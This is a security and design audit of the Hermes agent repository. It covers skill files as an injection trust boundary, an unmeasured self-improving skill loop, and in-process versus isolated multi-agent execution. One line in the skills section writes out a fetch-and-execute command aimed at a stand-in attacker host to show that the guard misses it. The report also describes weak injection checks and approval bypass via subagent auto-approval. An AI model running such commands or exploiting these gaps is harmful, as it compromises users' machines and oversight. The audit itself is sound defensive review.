# 06 — Hermes: skills, procedural learning, and multi-agent execution

Repository `NousResearch/hermes-agent` @ `ed5e17f4b86da0c4f09c0694757b6074ae6b9d16`.
All findings are static-analysis findings; no Hermes code was executed (see `01`).

This artifact answers two of the audit's central questions: does Hermes actually convert
solved work into reusable procedure, and does it actually make parallel agent work safe?

---

## Part 1 — Skills and procedural learning

### What the system is

A skill is a directory holding `SKILL.md` (YAML frontmatter + markdown body) plus optional
`references/`, `templates/`, `scripts/`, `assets/`. The repo ships 79 bundled skills across
15 categories and 114 optional ones across 21. `tools/skills_sync.py` hash-seeds bundled
skills into `~/.hermes/skills/` with a `.bundled_manifest` so user edits survive upgrades.

Discovery is an `os.walk` for `SKILL.md` (`agent/skill_utils.py:877`), filtered by
`platforms`, `environments`, disabled lists, and conditional toolset gates.

**Routing is pure model judgment.** `agent/prompt_builder.py:1679` renders a
`category: name: description` index into the system prompt under a "## Skills (mandatory)"
directive telling the model to load anything "even partially relevant"
(`agent/prompt_builder.py:1933-1958`). Descriptions are hard-truncated to 60 characters
(`agent/skill_utils.py:849,858-865`). There is no embedding search, no ranking, no scoring —
**the 60-character truncation is the entire routing signal** (HA-302). The project knows
this: the create-path validator rejects longer descriptions precisely because truncation is
"destroying the routing signal" (`tools/skill_manager_tool.py:607-614`). All 193 in-repo
skills comply, mean length 54.4 — enforced by `tests/skills/test_authoring_standards.py`.

### The learning loop is open — the single most important finding in this lane

Hermes's README calls it "**the self-improving AI agent**… the only agent with a built-in
learning loop." Three of the four legs are real. The fourth does not exist.

| Leg | Implementation | State |
|---|---|---|
| Write | `agent/background_review.py` fork, `/learn`, `skill_manage` | IMPLEMENTED |
| Store | `~/.hermes/skills` + `.usage.json` | IMPLEMENTED |
| Prune | `agent/curator.py:305` `apply_automatic_transitions` | IMPLEMENTED |
| **Measure** | — | **ABSENT** |

**HA-306 (HIGH).** The entire per-skill usage record (`tools/skill_usage.py:664-681`) is
`use_count`, `view_count`, `last_used_at`, `patch_count`, timestamps, and flags. Every field
is a count, a time, or a flag. Nothing records whether the turn that loaded the skill
succeeded, how many tool calls it took, how many tokens it cost, or whether the user
corrected the result. The derived quantities `latest_activity_at()` / `activity_count()`
(`tools/skill_usage.py:146,166`) are "when" and "how many", never "how well."

**HA-307 (HIGH).** Consequently the loop never closes:

- Archival is decided purely by wall clock — stale at 30d, archived at 90d
  (`agent/curator.py:321-322,350-381`).
- The curator's own LLM prompt **forbids** using the one usage signal it has: "DO NOT use
  usage counters as a reason to skip consolidation… Judge overlap on CONTENT, not on
  use_count" (`agent/curator.py:452-459`).
- The only exported metrics are bucketed reuse counters
  (`hermes_cli/observability/shared_metrics_contract.py:33-34,636-670`).
- Tests: **none found** asserting any before/after, effectiveness, or regression property
  of a skill.

**HA-308 (HIGH).** Both autonomous writers carry production quotas with no quality signal.
The generative prompt states "most sessions produce at least one skill update… A pass that
does nothing is a missed learning opportunity, not a neutral outcome"
(`agent/background_review.py:183-186`). The destructive prompt sets a numeric floor: "If you
end the pass with fewer than 10 archives, you stopped too early"
(`agent/curator.py:545-548`). The repo records this failing open once already:
`tools/skill_manager_tool.py:473-481` documents a consolidation pass that "archived whole
clusters of active skills with zero verified consolidations… leaving active automations
pointing at names that no longer resolve" (issue #29912). The fix was a fail-closed
`absorbed_into` requirement — not a quality measure.

**HA-309 (MEDIUM).** Growth is default-on (`agent/agent_init.py:1798`, nudge interval 10);
consolidation is default-**off** (`agent/curator.py:78`,
`hermes_cli/config_defaults.py:1929`) for aux-model cost reasons. On a stock install the
only garbage collection is the 30/90-day clock.

**HA-304 / HA-315 (MEDIUM).** After any turn with ≥10 tool iterations,
`agent/turn_finalizer.py:733-765` forks a background `AIAgent` that replays the conversation
with a `{memory, skill_manage}` whitelist and writes directly to `~/.hermes/skills/`. The
approval gate `skills.write_approval` defaults to **False**
(`hermes_cli/config_defaults.py:1898`). The shipped example config describes this as a
"reminder to the model" (`cli-config.yaml.example:832`); the code spawns an unattended
second model call that edits the user's skill library. The defaults also disagree — code 10,
example config 15.

### Verdict on the audit's thesis

> *Can Hermes convert solved work into reliable reusable procedure that materially reduces
> future reasoning and user steering?*

**It can convert solved work into stored procedure. It cannot show that doing so helps, and
it does not try.** The README claim "self-improving" is `PARTIAL` at best and
`MISLEADING` in its strongest reading: improvement is asserted by construction (a skill was
written) rather than measured by outcome. The audit's own POC-D could not close this gap
either, because measuring it requires paid inference (see `16-poc-results.md`). **No
efficiency claim for skill reuse appears anywhere in this audit.**

### Skills as a trust boundary

**HA-311 (HIGH).** Skill content is instruction, not data. A `/skill` invocation builds a
user-role message prefixed "[IMPORTANT: The user has invoked the … skill, indicating they
want you to follow its instructions]" with the body inlined verbatim
(`agent/skill_commands.py:630-632`). The load-time injection check lowercases content, tests
9 hardcoded substrings (`tools/skills_tool.py:234-246`), and on a hit calls
`logging.warning(...)` — the warning is **never** returned to the caller. The code is
explicit: "# Injection scan — log but still serve (matches local-skill behaviour)"
(`tools/skills_tool.py:981-985`).

**HA-312 (HIGH).** `SKILL.md` bodies can execute host shell at load time.
`agent/skill_preprocessing.py:19` defines ``_INLINE_SHELL_RE = r'!`([^`\n]+)`'`` and
`:106-125` substitutes each match with the stdout of `subprocess.run(['bash','-c',cmd])`.
Default off (`skills.inline_shell: False`) and honestly documented — but neither
`tools/skills_guard.py` nor `tools/skill_linter.py` knows the syntax exists. The nearest
guard rule requires a `$( )` inside the backticks, so a plain ``!`curl attacker.tld|sh` ``
is unmatched. The flag is a single global key: enabling it for one trusted source applies it
to every skill loaded thereafter.

**HA-313 (MEDIUM).** `skills_guard` is ~180 regexes whose verdict function treats
"medium/low findings alone [as] informational, not blocking"
(`tools/skills_guard.py:1139-1152`), so a skill with twenty medium supply-chain findings
scores "safe". Matching is line-oriented and defeated by splitting a payload across lines.
The scan is install-time only and never re-run at load.

**Calibration.** These are consistent with upstream's declared model, not surprises.
`SECURITY.md` §2.4 states Skills Guard "is a review aid; the boundary for third-party skills
is operator review before install," and that "skills execute arbitrary Python at import
time." They are reported here because they determine *how* Dime or Tailered could adopt the
mechanism, not as accusations.

### Adoption consequence

Dime's 102 project skills already use the identical `SKILL.md` `name`/`description`
frontmatter convention (`.claude/skills/intended-vs-implemented/SKILL.md:1-4`). **The format
transfer is a no-op.** The only novel mechanism is the autonomous write/curate loop — and
that loop is unmeasured, quota-driven, default-on, and destructive-by-default
(`skill_manage(delete)` `rmtree`s an unpinned user skill with no archive and no approval,
HA-316). Adopting it would import an unmeasured self-modifying writer into a repo governed
by "no unaccounted spend" and "evidence before assertions."

**Disposition: REFERENCE** (borrow the outcome-linked-measurement gap as a design lesson —
build the measurement leg Hermes omits), **REJECT** for direct adoption of the autonomous
writer.

---

## Part 2 — Multi-agent and parallel execution

Hermes has **two structurally different multi-agent lanes that share almost no coordination
machinery**. Conflating them is the most common error an evaluator can make here.

### Lane 1 — `delegate_task` (in-process, NOT isolated)

The parent constructs child `AIAgent` objects **in the same Python process**
(`tools/delegate_tool.py:1617`) on a daemon thread pool (`:2308,:3418`). "Isolation" means
*conversation* isolation only: fresh message list, `skip_context_files`/`skip_memory`, own
`task_id`. Children are explicitly seeded with the parent's cwd (`:2287`) and aliased into
the parent's container (`:2292`). **No worktree, no chroot, no per-child branch.**

**HA-402 (HIGH).** Nothing prevents two concurrent subagents from corrupting the same file.
`tools/file_state.py` is a process-wide singleton with per-path `threading.Lock`
(`:59-90,:262`) whose `check_stale()` returns an **advisory string** — the write executes
unconditionally and the warning is attached as `_warning` in the JSON result
(`file_tools.py:2154-2180`).

Related: duplicate work is not prevented and identical-goal fan-out is explicitly allowed
(HA-405); an abandoned delegation is recorded `unknown` and never resumed (HA-406); the
concurrency cap is per-call, so defaults permit ~9 concurrent in-process subagents (HA-409);
default child timeout is `None` and the stuck-child backstop exists only in the gateway
(HA-410); interrupt cannot hard-kill, so an abandoned child keeps running inside the parent
process (HA-416).

**HA-408 (MEDIUM).** `delegation.subagent_auto_approve: true` lets a child auto-approve
dangerous commands the parent would have prompted for — a configured privilege escalation
across the delegation boundary.

### Lane 2 — the Kanban board (genuinely isolated)

`hermes_cli/kanban_db.py` (11,320 LOC) is a real distributed task system: SQLite tasks with
a compare-and-swap claim (`claim_task:4353`), claim TTLs, `worker_pid`, heartbeats, TTL
reclaim with liveness backstops (`release_stale_claims:4683`), crash detection, per-run
history, dependency links, review/blocked states, a respawn guard against duplicate work
(`:8987`), a board-scoped cross-process dispatch lock (`:9261`), a machine-wide dispatcher
flock (`gateway/kanban_watchers.py:76`), and **real OS-process workers** spawned via
`subprocess.Popen` of `hermes -p <profile> --cli chat -q` (`:10009-10221`).

Workspaces are per-task: a scratch dir by default, and **real linked git worktrees**
(`git worktree add`, `:7346`) when `workspace_kind='worktree'` — automatic for
project-linked tasks (`:3095`).

**This is the one genuinely valuable multi-agent mechanism in Hermes** (HA-403, HA-404,
HA-414), and it is the lane the README's "spawn isolated subagents for parallel workstreams"
sentence does *not* describe — that sentence describes Lane 1, which is not isolated.

### Adoption consequence for Tailered OS

The audit's parallelism question does **not** resolve in favor of adopting either lane,
because of POC-C: Tailered's own ledger is not concurrency-safe. Three concurrent ship runs
produced 4 duplicate route ids, 10 validator errors, and one started run with **no terminal
eval** — violating `AGENTS.md:18`. The root cause is read-then-write id allocation
(`src/ledger.ts:117-127`) over an unlocked append (`src/files.ts:52-64`), plus `appendAdr`
running before `appendTerminalEval` inside the same `finally` (`src/ship.ts:420` vs `:466`).

**No agent runtime can fix that**, because the corruption happens after the agent returns.
Ledger concurrency-safety is a prerequisite for parallelism, not a beneficiary of adoption.

The transferable idea is the **CAS-claim + TTL + heartbeat + liveness** ownership pattern
and the **worktree-per-task** workspace model — both architectural lessons Tailered can
implement in ~200 lines of its own zero-dependency TypeScript, without importing 11,320
lines of SQLite Kanban.

**Disposition: REFERENCE** (Kanban ownership + worktree pattern), **REJECT** (`delegate_task`
in-process model — it is weaker than what Tailered needs and weaker than what its own README
implies).
